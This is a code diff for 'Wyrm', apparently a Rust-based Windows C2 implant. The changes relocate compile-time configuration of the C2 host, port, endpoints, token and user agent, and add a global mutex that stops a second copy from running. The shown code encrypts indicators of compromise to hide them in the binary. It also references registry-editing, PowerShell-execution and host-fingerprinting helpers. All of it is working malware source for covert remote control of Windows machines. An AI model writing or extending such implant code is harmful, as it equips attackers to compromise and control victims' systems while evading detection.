@@ -2,7 +2,8 @@
 //! on the implant.
 
 use std::{
-    collections::VecDeque, path::PathBuf, process::exit, ptr::null_mut, sync::atomic::Ordering,
+    collections::VecDeque, ffi::c_void, path::PathBuf, process::exit, ptr::null_mut,
+    sync::atomic::Ordering,
 };
 
 use rand::{Rng, rng};
@@ -15,12 +16,12 @@ use shared::{
 use str_crypter::{decrypt_string, sc};
 use windows_sys::{
     Win32::{
-        Foundation::{GetLastError, MAX_PATH},
+        Foundation::{CloseHandle, ERROR_ALREADY_EXISTS, FALSE, GetLastError, MAX_PATH},
         NetworkManagement::NetManagement::UNLEN,
         Storage::FileSystem::GetVolumeInformationW,
         System::{
             ProcessStatus::GetModuleFileNameExW,
-            Threading::{GetCurrentProcess, GetCurrentProcessId},
+            Threading::{CreateMutexA, GetCurrentProcess, GetCurrentProcessId},
             WindowsProgramming::{GetComputerNameW, GetUserNameW, MAX_COMPUTERNAME_LENGTH},
         },
     },
@@ -40,7 +41,9 @@ use crate::{
         registry::{reg_add, reg_del, reg_query},
         shell::run_powershell,
     },
-    utils::{svc_controls::stop_svc_and_exit, time_utils::epoch_now},
+    utils::{
+        comptime::translate_build_artifacts, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
+    },
 };
 
 pub struct RetriesBeforeExit {
@@ -61,6 +64,8 @@ pub struct Wyrm {
     pub completed_tasks: CompletedTasks,
     pub current_working_directory: PathBuf,
     pub first_connection_retries: RetriesBeforeExit,
+    #[allow(unused)]
+    mutex: WyrmMutex,
 }
 
 /// The C2 configuration settings for the implant; there can be any number of these
@@ -88,6 +93,7 @@ impl Wyrm {
             url,
             agent_name_by_operator,
             jitter,
+            mutex,
         ) = translate_build_artifacts();
 
         Self {
@@ -117,6 +123,7 @@ impl Wyrm {
                 num_retries: 3,
             },
             agent_name_by_operator,
+            mutex: WyrmMutex::new(&mutex),
         }
     }
 
@@ -531,96 +538,6 @@ pub fn get_hostname() -> String {
     }
 }
 
-type SleepSeconds = u64;
-type ApiEndpoint = Vec<String>;
-type SecurityToken = String;
-type Useragent = String;
-type Port = u16;
-type URL = String;
-type AgentNameByOperator = String;
-type Jitter = u64;
-
-/// Translates build artifacts passed to the compiler by the build environment variables
-/// taken from the profile
-fn translate_build_artifacts() -> (
-    SleepSeconds,
-    ApiEndpoint,
-    SecurityToken,
-    Useragent,
-    Port,
-    URL,
-    AgentNameByOperator,
-    Jitter,
-) {
-    // Note: This doesn't leave traces in the binary (other than unencrypted IOCs to be encrypted in a
-    // upcoming small update). We use `option_env!()` to prevent rust-analyzer from having a fit - whilst
-    // this could allow bad data, we prevent this at compile time with unwrap().
-    let sleep_seconds: u64 = option_env!("DEF_SLEEP_TIME").unwrap().parse().unwrap();
-    const URL: &str = option_env!("C2_HOST").unwrap_or_default();
-    const API_ENDPOINT: &str = option_env!("C2_URIS").unwrap_or_default();
-    const SECURITY_TOKEN: &str = option_env!("SECURITY_TOKEN").unwrap_or_default();
-    const AGENT_NAME: &str = option_env!("AGENT_NAME").unwrap_or_default();
-    const USERAGENT: &str = option_env!("USERAGENT").unwrap_or_default();
-    let port: u16 = option_env!("C2_PORT").unwrap().parse().unwrap();
-    let jitter: Jitter = option_env!("JITTER").unwrap().parse().unwrap();
-
-    // to make the compiler comply, we have to construct the above including a default
-    // value if the env var was not present, we want to check for those default values
-    // and quit if they are present as that is considered a fatal error.
-    if URL.is_empty() {
-        #[cfg(debug_assertions)]
-        print_failed("URL was empty");
-
-        exit(0);
-    }
-
-    if API_ENDPOINT.is_empty() {
-        #[cfg(debug_assertions)]
-        print_failed("API_ENDPOINT was empty");
-
-        exit(0);
-    }
-
-    if SECURITY_TOKEN.is_empty() {
-        #[cfg(debug_assertions)]
-        print_failed("SECURITY_TOKEN was empty");
-
-        exit(0);
-    }
-
-    if USERAGENT.is_empty() {
-        #[cfg(debug_assertions)]
-        print_failed("USERAGENT was empty");
-
-        exit(0);
-    }
-
-    //
-    // Encrypt the relevant IOCs into the binary
-    //
-    let url = sc!(URL, 41).unwrap();
-    let useragent = sc!(USERAGENT, 49).unwrap();
-    let agent_name_by_operator = sc!(AGENT_NAME, 128).unwrap();
-    let security_token = sc!(SECURITY_TOKEN, 153).unwrap();
-
-    // The API endpoints are encoded as a csv; so we need to construct a Vec from that
-    let api_endpoints = API_ENDPOINT
-        .split(',')
-        .map(|s| s.to_string())
-        .collect::<Vec<String>>();
-
-    (
-        sleep_seconds,
-        api_endpoints,
-        security_token,
-        useragent,
-        port,
-        url,
-        agent_name_by_operator,
-        jitter,
-    )
-}
-
 pub fn calculate_sleep_seconds(wyrm: &Wyrm) -> u64 {
     // If no jitter set, or is 0 - sleep normal amount
     if wyrm.c2_config.jitter == 0 {
@@ -655,4 +572,70 @@ pub fn calculate_sleep_seconds(wyrm: &Wyrm) -> u64 {
 
     let mut rng = rng();
     rng.random_range(min_sleep..=wyrm.c2_config.sleep_seconds)
+}
+
+struct WyrmMutex {
+    handle: *mut c_void,
+}
+
+impl WyrmMutex {
+    /// Constructs a new [`WyrmMutex`] setting the inner handle if we were successful. This function will
+    /// exit the application if the mutex is already registered.
+    fn new(mtx_name: &str) -> Self {
+        // Start off setting this explicitly to null, we can then add a value to it if we successfully create the
+        // mutex.
+
+        let mut mtx_name = format!("Global\\{mtx_name}\0");
+        if mtx_name.len() >= MAX_PATH as usize {
+            mtx_name = mtx_name[0..MAX_PATH as usize].to_string();
+        }
+
+        let handle = unsafe { CreateMutexA(null_mut(), FALSE, mtx_name.as_ptr() as *const u8) };
+        let last_error = unsafe { GetLastError() };
+
+        let wyrm_mutex = Self { handle };
+
+        //
+        // Check whether the mutex already exists on the system
+        //
+
+        if last_error == ERROR_ALREADY_EXISTS {
+            #[cfg(debug_assertions)]
+            {
+                print_failed("Mutex already exists");
+            }
+
+            exit(0);
+        }
+
+        // Error check
+        if handle.is_null() {
+            #[cfg(debug_assertions)]
+            {
+                print_failed(format!(
+                    "Failed to generate mutex with CreateMutexA. Last error: {last_error:#X}",
+                ));
+            }
+
+            return wyrm_mutex;
+        }
+
+        #[cfg(debug_assertions)]
+        {
+            use shared::pretty_print::print_success;
+            print_success(format!("Mutex {mtx_name} registered."));
+        }
+
+        wyrm_mutex
+    }
+}
+
+impl Drop for WyrmMutex {
+    fn drop(&mut self) {
+        if !self.handle.is_null() {
+            unsafe {
+                let _ = CloseHandle(self.handle);
+            }
+        }
+    }
 }
